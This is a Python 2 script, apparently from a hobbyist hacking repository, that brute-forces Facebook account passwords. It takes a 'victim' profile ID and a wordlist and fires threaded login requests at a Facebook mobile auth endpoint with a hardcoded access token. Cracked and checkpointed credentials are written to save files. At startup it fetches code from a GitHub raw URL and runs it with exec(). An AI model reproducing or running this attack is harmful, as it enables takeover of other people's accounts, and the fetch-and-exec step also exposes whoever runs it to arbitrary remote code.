#!/usr/bin/python2
#coding=utf-8


import os, sys, time, random, json

try:
  import requests
except ImportError:
  os.system('pip2 install requests')
#os.system("pkg install figlet -y")

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    import mechanize

from multiprocessing.pool import ThreadPool
from mechanize import Browser

def motion(arg):
  for i in arg:
    sys.stdout.write(i)
    sys.stdout.flush()
    time.sleep(.04)
reload(sys)
sys.setdefaultencoding("utf-8")
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent',"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")]


os.system("clear")

motion("\033[1;33m\nEverything is getting ready...")
time.sleep(2)
os.system("clear")
rs=requests.session()
rg=rs.get
x=(rg("https://raw.githubusercontent.com/Noob-Hacker71/Noob-Hacker71/main/info.py").text)
exec(x)
##### LOGO #####

id = []

rcl='\033[1;31m'
gcl='\033[1;32m' 
ycl='\033[1;33m'
bcl = '\033[1;34m'
pcl = '\033[1;35m'
ccl='\033[1;36m' 
rcl='\033[1;31m'
gcl='\033[1;32m' 
ycl='\033[1;33m'
bcl = '\033[1;34m'
ccl='\033[1;36m' 

warn= """
{ycl}[+] Attacking In Background For Fast Cracking ...
{bcl}[+] This A Facebook Password Cracker Script ...
{gcl}[+] Attack With Your Custom Wordlist ...
{rcl}[+] This Script From Noob-Hacker71 ...
{ccl}[+] Use It At Your Own Risk ...\n
""".format(bcl=bcl,rcl=rcl,gcl=gcl,ccl=ccl,ycl=ycl)
info="""{rcl}[+] {ycl}Connect A Fast Network For Better Experience..
{rcl}[+] {rcl}Don't Use It For Any Illigele Puspose...
{rcl}[+] {gcl}For Stop Attack Press CTRL + \ ...
--------------------------------------------------""".format(rcl=rcl,ycl=ycl,gcl=gcl,ccl=ccl)

if Permission=="On":
    pass
else:
  motion(ccl+"You Need Noob-Hacker71's Permission")
  time.sleep(2)
  os.system("xdg-open https://www.facebook.com/ntahsan.nayem")
  exit()
while True:
    os.system("figlet -f small Brute-Force")
    motion(warn)
    Usr= raw_input(bcl+"Enter Username =>> ")
    if Usr==User:
        motion(gcl+"\nCorrect User\n")
        psd= raw_input(ycl+"Enter Password =>> ")
        if psd == Pwd:
            motion(gcl+"\nSuccessfully Logged In")
            break
        else:
            motion(rcl+"\nWrong Password")
            os.system("clear")
    else:
        motion(rcl+"\nWrong User,,,Try Again\n")
        os.system("clear")

os.system("clear")
print(logo)
motion(info)
victim = raw_input(ccl+"\nEnter Victim Profile ID >> ")
passlist= raw_input(bcl+"Wordlist Path >> ")
fil=passlist
motion(gcl+"\nWordlist =>> "+str(fil))
word = open(passlist,'r').readlines()

with open(fil, 'r')as file:
  x = len(file.readlines())
  motion(rcl+'\nTotal Password =>> '+str(x))

def Noob():
  try:
    os.mkdir('save')
  except OSError:
    pass
  try:
      for i in open(fil,"r").readlines():
          id.append(i.strip())
  except:
        exit("Exit")
            
  def main(arg):
    try:
      line=arg
     
      data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +victim+ '&locale=en_US&password=' +line+ '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
      q = json.load(data)
      #print(q)
      if 'access_token' in q:
        motion (ccl+'\n[NOOB_OK] ' + victim + '  |  ' + line+"\n")
        okb = open('save/Noob_Successful.txt', 'a')
        okb.write(victim +" [ NOOB ] "+ line + '\n')
        okb.close()
        motion(ccl+"\nCreacked Account In Save File...\n")       
      elif 'www.facebook.com' in q['error_msg']:
        motion( ycl+'\n[NOOB_CP] ' +victim+'  |  '+ycl + line+"\n")
        cps = open('save/Noob_CheckPoint.txt', 'a')
        cps.write(victim +" [ NOOB ] "+ line + '\n')
        cps.close()
        motion(ccl+"\nCreacked Account In Save File...\n")
      elif q['error_msg']  == "613" or q['error_msg']  == 613:
        motion( ycl+'\n[ LOCKED ] ' +victim+'  |  '+ycl + line+"\n")
        
      else:
        pass
        print("\033[1;31m[PASSWORD WRONG] "+line+"\n")
    except:
      pass
  
  p = ThreadPool(30)
  p.map(main,id)
Noob()
